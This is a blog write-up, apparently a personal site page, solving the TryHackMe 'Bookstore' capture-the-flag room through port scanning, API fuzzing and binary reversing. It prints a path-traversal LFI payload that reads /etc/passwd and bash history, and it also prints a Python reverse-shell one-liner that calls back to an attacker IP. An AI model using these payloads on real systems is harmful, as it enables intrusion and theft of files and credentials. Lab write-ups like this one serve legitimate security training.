@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+<title>Antoni Chrobot</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Bootstrap -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
+
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto'>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/styles/atelier-forest-dark.min.css" integrity="sha512-bHrTOKTYdBppORvOCgGWhwUt68kqsl5e9cemM/7hf1uehwPUjtAiGyXzcoBFRN3SnktP0582tbAzkPPMWVTgVQ==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<!-- mathjax  -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+
+<link rel="stylesheet" href="../style.css">
+<style>
+html,body,h1,h2,h3,h4,h5,h6 {font-family: "Roboto", sans-serif}
+</style>
+
+<body>
+
+<!-- Page Container -->
+<div class="container-fluid px-5">
+
+<!-- navbar  -->
+<nav class="navbar navbar-expand-lg topnav mt-1 mb-3 p-0">
+    	
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+    <span class="navbar-toggler-icon">
+    <i class="fa fa-navicon" style="color: white"></i>
+    </span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="collapsibleNavbar">
+    	
+    <ul class="navbar-nav">
+	<li class="nav-item">
+	    <a class="navlink" href="../index.html">Home</a>
+	</li>
+	<li class="nav-item">
+	    <a class="navlink" href="../projects.html">Projects</a>
+	</li>
+	<li class="nav-item">
+	    <a class="active navlink" href="../ctf.html">CTF</a>
+	</li>
+    </ul>
+
+    </div>
+</nav>
+<!-- end navbar  -->
+	
+
+<div class="row justify-content-center"> 
+
+    <div class="col-12 col-xl-9">
+
+    <div class="w3-display-container w3-container gray-bg w3-card  w3-margin-bottom">
+
+	<!-- CONTENT GOES HERE -->
+
+	<h2 class="title mb-2">TryHackMe: Bookstore</h2>
+	<div class="meta mb-3">
+	<span class="date">December 1,2020</span>
+	</div>
+	<hr>
+
+	Room link:
+	<a href="https://tryhackme.com/room/bookstoreoc">https://tryhackme.com/room/bookstoreoc</a>
+
+	<h2>Enumeration</h2>
+
+	<h3>Port scanning</h3>
+
+	<pre><code class="nohighlight">
+	nmap -sV -sC -v -oN scan.txt 10.10.242.39
+	</code></pre>
+
+	<pre><code class="nohighlight">
+	Nmap 7.80 scan initiated Mon Nov 30 21:17:11 2020 as: 
+	Increasing send delay for 10.10.242.39 from 0 to 5 due to 46 out of 151 dropped probes since last increase.
+	Nmap scan report for 10.10.242.39
+	Host is up (0.095s latency).
+	Not shown: 997 closed ports
+	PORT     STATE SERVICE VERSION
+	22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
+	|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
+	|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
+	80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+	|_http-favicon: Unknown favicon MD5: 834559878C5590337027E6EB7D966AEE
+	| http-methods: 
+	|_  Supported Methods: OPTIONS HEAD GET POST
+	|_http-server-header: Apache/2.4.29 (Ubuntu)
+	|_http-title: Book Store
+	5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
+	| http-methods: 
+	|_  Supported Methods: GET OPTIONS HEAD
+	| http-robots.txt: 1 disallowed entry 
+	|_/api &lt;/p&gt; 
+	|_http-title: Home
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+	</code></pre>
+
+	<p>We have SSH, a web service at port 80 and a web service at port 5000.</p>
+
+	<p>The main web app at port 80 was not very interesting. There was an endpoint <code>/books.html</code>
+	which displayed a random assortment of books by AJAX requests to an api running on port 5000. I decided to focus my efforts on port 5000 to enumerate the api.</p>
+
+	<p>When visiting <code>http://$IP:5000</code> we get a static page which informs us about the following api endpoints:</p>
+
+	<pre><code class="nohighlight">
+	/api/v2/resources/books/all (Retrieve all books and get the output in a json format) 
+	/api/v2/resources/books/random4 (Retrieve 4 random records) 
+	/api/v2/resources/books?id=1(Search by a specific parameter , id parameter) 
+	/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling) 
+	/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993) 
+	/api/v2/resources/books?author=J.K. Rowling&amp;published=2003 (Search by a combination of 2 or more parameters)
+	</code></pre>
+
+	<h3>Directory brute forcing</h3>
+
+	<p>I ran dirsearch on this port 5000 service:
+	<a href="../images/thm-bookstore/dirsearch.png"/>
+	<img class="blog-img" src="../images/thm-bookstore/dirsearch.png" alt="png" title="" />
+	</a>
+
+	Found interesting endpoint: <code>http://10.10.242.39:5000/console</code></p>
+
+	<p>However, it requires a PIN to access it. Will come back to this, or try to find PIN.</p>
+
+	<a href="../images/thm-bookstore/console-locked.png"/></p>
+	<img class="blog-img" src="../images/thm-bookstore/console-locked.png" alt="png" title="" />
+	</a>
+
+
+	<h3>API fuzzing</h3>
+
+	<p>All api endpoints that were provided, called <code>/api/v2/...</code>
+	I tried making calls to <code>/api/v1/...</code> and this endpoint returned the same data as <code>api/v2</code> </p>
+
+	<p>This certainly caught my attention. Perhaps there are other endpoints at v1, or some vulnerability which was fixed in v2. I decided to look closer at the api calls made by the main website at <code>/books.html</code></p>
+
+	<p>A quick look at the page source revealed that all static files were held under <code>/assets/</code></p>
+
+	<p>I found file <code>/assets/js/api.js</code>, which made the AJAX requests. At the very bottom of the source was a comment: 
+	<pre><code class="nohighlight">
+	//the previous version of the api had a paramter which lead to local file inclusion vulnerability, glad we now have the new version which is secure.
+	</code></pre>
+
+	<p>My suspicions were correct. We know we have LFI, likely from a GET parameter.</p>
+
+	<p>I used <a href="https://github.com/s0md3v/Arjun">arjun</a> to look for parameters:</p>
+	<a href="../images/thm-bookstore/arjun-output.png"/>
+	<img class="blog-img" src="../images/thm-bookstore/arjun-output.png" alt="png" title="" />
+	</a>
+
+	<p>... and quickly discovered that the parameter <code>show</code> was vulnerable to LFI:</p>
+	<pre><code class="nohighlight">
+	http://10.10.242.39:5000/api/v1/resources/books?show=../../../../etc/passwd
+	</code></pre>
+
+	<a href="../images/thm-bookstore/etc-passwd.png"/>
+	<img class="blog-img" src="../images/thm-bookstore/etc-passwd.png" alt="png" title="" />
+	</a>
+
+	<h3>Looking at local files</h3>
+
+	<p>Let's continue enumerating local files, and see if anything interesting exists.</p>
+
+	<p>In the working directory, I found user.txt and got the flag using with LFI:
+	<code>
+	http://10.10.242.39:5000/api/v1/resources/books?show=user.txt
+	</code></p>
+
+	<p>I then looked at the users bash history and found the console PIN with LFI:
+	<code>
+	http://10.10.242.39:5000/api/v1/resources/books?show=.bash_history
+	</code></p>
+	<a href="../images/thm-bookstore/bash-history.png"/> 
+	<img class="blog-img" src="../images/thm-bookstore/bash-history.png" alt="png" title="" />
+	</a>
+
+	<p>I now had credentials for the console!</p>
+
+	<p>The console is simply a python interpreter. I was able to get a reverse shell by using: 
+	<pre><code class="python">
+	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.22.43",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+	</code></pre>
+	and using <code>nc -lnvp 4444</code> locally to catch the reverse shell.</p>
+
+	<p>We are now logged in as user sid.</p>
+	<a href="../images/thm-bookstore/sid_logged_in_prompt.png"/> 
+	<img class="blog-img" src="../images/thm-bookstore/sid_logged_in_prompt.png" alt="png" title="" /> 
+	</a>
+
+	<h2>Privilege Escalation / Reversing</h2>
+	<p>In <code>/home/sid</code> there was an executable, <code>try-harder</code>, with SUID bit. This means we can run this executable with root priveleges.</p>
+
+	<p>I ran strings on this executable and saw /bin/bash in the output, which tells me that we can get a root shell through this executable, somehow.</p>
+
+	<p>When running <code>./try-harder</code> we have the following prompt:</p>
+	<a href="../images/thm-bookstore/try-harder-output.png"/>
+	<img class="blog-img" src="../images/thm-bookstore/try-harder-output.png" alt="png" title="" />
+	</a>
+
+	<p>So now how do we find the magic number?</p>
+
+	<p>I disassembled the executable and started reversing.</p>
+	<a href="../images/thm-bookstore/main-disassembly.png"/>
+	<img class="blog-img" src="../images/thm-bookstore/main-disassembly.png" alt="png" title="" />
+	</a>
+
+	<p>In main, we use <code>scanf</code> to get user input, xor the input with <code>0x1116</code>, xor the result of that with a local variable (in this case it is rbp-0x10, which is initialized with a value of <code>0x5db3</code>), and finally compare the result with <code>0x5dcd21f4</code>. If the result matches this constant, we have a root shell, otherwise the program says <code>Incorrect Try Harder</code> and exits.</p>
+
+	<p>We have to solve the equation:
+	$$ 0x5dcd21f4 = (input \oplus 0x1116) \oplus 0x5db3 $$
+	</p>
+
+	<p>Using the identities, \(a \oplus a = 0\) and \(a \oplus 0 = a\), we can solve for <code>input</code>:
+	$$ 0x5dcd21f4 = (input \oplus 0x1116) \oplus 0x5db3 $$
+	$$ input = 0x5dcd21f4  \oplus 0x5db3 \oplus 0x1116 $$
+	</p>
+
+	<p>Giving this value in decimal representation to the executable gives us our root shell:</p>
+	<a href="../images/thm-bookstore/root-prompt.png"/>
+	<img class="blog-img" src="../images/thm-bookstore/root-prompt.png" alt="png" title="" />
+	</a>
+
+	<p>All that is left is to cat out the root flag:</p>
+	<pre><code class="nohighlight">
+	cat /root/root.txt
+	</code></pre>
+
+	<!-- END CONTENT -->
+
+
+    </div> <!-- End display container -->
+    </div> <!-- End columns -->
+</div> <!-- End row -->
+
+<!-- footer for small devices -->
+<footer class="fixed-bottom w3-deep-purple w3-center pt-1 mt-3">
+  <p class="m-0"><a href="#" ><u>Top</u></a></p>
+    <a class="my-0 mx-2" href="mailto:antoni.chrobot@gmail.com"><i class="fa fa-envelope w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://www.linkedin.com/in/antonichrobot/" ><i class="fa fa-linkedin w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://github.com/achrobot1" ><i class="fa fa-github "></i></a>
+
+    <a class="my-0 mx-2" href="https://twitter.com/AntoniChrobot" ><i class="fa fa-twitter w3-hover-opacity"></i></a>
+
+</footer>
+
+
+<!-- Footer for large devices -->
+<footer class="d-none d-xl-block fixed-bottom w3-deep-purple w3-center pt-1 mt-3">
+  <p class="m-0"><a href="#" ><u>Top</u></a></p>
+    <a class="my-0 mx-2" href="mailto:antoni.chrobot@gmail.com"><i class="fa fa-envelope w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://www.linkedin.com/in/antonichrobot/" ><i class="fa fa-linkedin w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://github.com/achrobot1" ><i class="fa fa-github "></i></a>
+
+    <a class="my-0 mx-2" href="https://twitter.com/AntoniChrobot" ><i class="fa fa-twitter w3-hover-opacity"></i></a>
+
+  <p class="m-0">Find me on social media.</p> 
+  
+</footer>
+
+</body>
+</html>
+
+
